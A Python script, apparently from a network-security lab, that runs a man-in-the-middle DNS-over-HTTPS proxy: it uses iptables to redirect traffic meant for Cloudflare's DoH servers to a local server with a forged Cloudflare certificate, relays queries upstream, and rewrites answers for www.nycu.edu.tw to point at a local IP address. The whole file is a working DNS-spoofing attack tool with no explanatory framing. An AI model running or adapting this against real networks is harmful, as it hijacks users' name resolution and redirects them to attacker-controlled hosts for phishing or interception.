#!/usr/bin/env python3
import asyncio
import base64
import os
import subprocess
import signal
import sys
from urllib.parse import parse_qs
from typing import Optional

import dns.message
import dns.rdatatype
import dns.rrset
import httpx
from hypercorn.asyncio import serve
from hypercorn.config import Config

LISTEN_PORT = 4443
SPOOF_DOMAIN = "www.nycu.edu.tw"
SPOOF_IPV4 = "192.168.126.132"  
SPOOF_TTL = 60

UPSTREAM_DOH_URL = os.getenv("UPSTREAM_DOH_URL", "https://mozilla.cloudflare-dns.com/dns-query")
CERT_FILE = "certificates/cloudflare.crt"
KEY_FILE = "certificates/cloudflare.key"

CLOUDFLARE_IPS = ["162.159.61.4", "172.64.41.4", "1.1.1.1"]

_upstream: Optional[httpx.AsyncClient] = None

def setup_network():
    cmds = [
        f"sudo sysctl -w net.ipv4.ip_forward=1",
        "sudo iptables -t nat -F",
        "sudo iptables -A OUTPUT -p icmp --icmp-type redirect -j DROP"
    ]
    # Redirect traffic for real Cloudflare DoH to our local proxy
    for ip in CLOUDFLARE_IPS:
        cmds.append(f"sudo iptables -t nat -A PREROUTING -p tcp -d {ip} --dport 443 -j REDIRECT --to-port {LISTEN_PORT}")
    
    for cmd in cmds:
        subprocess.run(cmd, shell=True, check=True)
    print('[*] Iptables and forwarding configured.')

def cleanup_network():
    subprocess.run("sudo iptables -F", shell=True)
    subprocess.run("sudo iptables -t nat -F", shell=True)
    subprocess.run("sudo sysctl -w net.ipv4.ip_forward=0", shell=True)
    print("[*] Network cleaned up.")

# ==========================================
# Core DoH Logic (Source 1 implementation)
# ==========================================
def _normalize_qname(name: str) -> str:
    return name.rstrip(".").lower()

def _b64url_decode_nopad(data: str) -> bytes:
    pad = "=" * ((4 - (len(data) % 4)) % 4)
    return base64.urlsafe_b64decode(data + pad)

async def _read_body(receive) -> bytes:
    body = bytearray()
    more = True
    while more:
        msg = await receive()
        body.extend(msg.get("body", b""))
        more = msg.get("more_body", False)
    return bytes(body)

def _rewrite_response(query_wire: bytes, upstream_wire: bytes) -> Optional[bytes]:
    query = dns.message.from_wire(query_wire)
    if not query.question:
        return None

    q = query.question[0]
    qname = _normalize_qname(str(q.name))
    
    if qname != SPOOF_DOMAIN:
        return None

    if q.rdtype != dns.rdatatype.A:
        return None

    upstream = dns.message.from_wire(upstream_wire)
    upstream.answer = []
    upstream.authority = []
    rrset = dns.rrset.from_text(q.name, SPOOF_TTL, "IN", "A", SPOOF_IPV4)
    upstream.answer.append(rrset)
    return upstream.to_wire()

async def app(scope, receive, send):
    global _upstream
    if scope["type"] == "lifespan":
        while True:
            msg = await receive()
            if msg["type"] == "lifespan.startup":
                _upstream = httpx.AsyncClient(http2=True, trust_env=False)
                await send({"type": "lifespan.startup.complete"})
            elif msg["type"] == "lifespan.shutdown":
                await _upstream.aclose()
                await send({"type": "lifespan.shutdown.complete"})
                return
        return

    if scope["type"] != "http" or scope["path"] != "/dns-query":
        return

    # Extract DNS query from GET or POST
    query_string = scope.get("query_string", b"")
    drained_body = await _read_body(receive)
    
    if scope["method"] == "GET":
        qs = parse_qs(query_string.decode(), keep_blank_values=True)
        dns_param = qs.get("dns", [""])[0]
        dns_query = _b64url_decode_nopad(dns_param)
    else:
        dns_query = drained_body

    # Forward to real upstream
    resp = await _upstream.post(UPSTREAM_DOH_URL, content=dns_query, 
                               headers={"content-type": "application/dns-message"})
    
    resp_body = resp.content
    rewritten = _rewrite_response(dns_query, resp.content)
    if rewritten:
        print(f"[!] Spoofing {SPOOF_DOMAIN}")
        resp_body = rewritten

    # Send response
    await send({"type": "http.response.start", "status": 200, "headers": [
        [b"content-type", b"application/dns-message"],
        [b"content-length", str(len(resp_body)).encode()]
    ]})
    await send({"type": "http.response.body", "body": resp_body})

if __name__ == "__main__":
    setup_network()
    config = Config()
    config.bind = [f"0.0.0.0:{LISTEN_PORT}"]
    config.certfile = CERT_FILE
    config.keyfile = KEY_FILE
    config.alpn_protocols = ["h2", "http/1.1"]

    def shutdown_handler(signum, frame):
        cleanup_network()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown_handler)
    
    try:
        asyncio.run(serve(app, config))
    finally:
        cleanup_network()